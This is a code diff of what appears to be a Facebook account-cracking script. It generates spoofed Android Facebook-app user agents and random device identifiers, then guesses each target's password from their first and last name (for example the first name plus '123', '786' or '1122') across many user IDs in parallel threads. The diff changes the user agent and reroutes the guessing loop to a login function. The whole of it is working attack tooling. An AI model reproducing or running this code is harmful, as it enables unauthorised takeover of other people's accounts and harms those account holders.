@@ -363,7 +363,7 @@ def m1(ids,passlist):
                         fbrv = '0'
                         fban = 'FB4A'
                         fbpn = 'com.facebook.katana'
-                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
+                        ua = 'Mozilla/5.0 (Linux; Android 10; C22 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]'
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -674,7 +674,7 @@ def gmail():
                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                         linex()
                         for user in fo:
-                                uid,names = user.split('|')
+                                ids,names = user.split('|')
                                 first_name = names.rsplit(' ')[0]
                                 try:
                                         last_name = names.rsplit(' ')[1]
@@ -682,8 +682,8 @@ def gmail():
                                         last_name = 'Khan'
                                 fs = first_name.lower()
                                 ls = last_name.lower()
-                                pwx = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                yaari.submit(fcrack,uid,pwx,tl)
+                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
+                                yaari.submit(m1,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
